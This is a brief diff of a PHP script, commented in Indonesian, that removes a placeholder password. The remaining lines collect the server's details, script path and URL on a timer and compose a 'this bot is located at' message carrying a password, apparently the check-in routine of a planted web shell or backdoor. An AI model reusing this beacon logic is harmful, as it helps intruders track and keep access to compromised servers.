@@ -40,9 +40,6 @@ if ($current_time - $_SESSION['last_sent_time'] >= $send_interval) {
     $script_name = "Script Name: " . $_SERVER['SCRIPT_NAME'] . "\n";
     $current_url = "URL: http://" . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME'] . "\n";
 
-    // Password yang ingin dikirim
-    $password = "your_password_here"; // Ganti dengan password yang sesuai
-
     // Buat pesan
     $message = "Bot ini berada di:\n" . $server_info . $script_name . $current_url . "Password: " . $password;
 
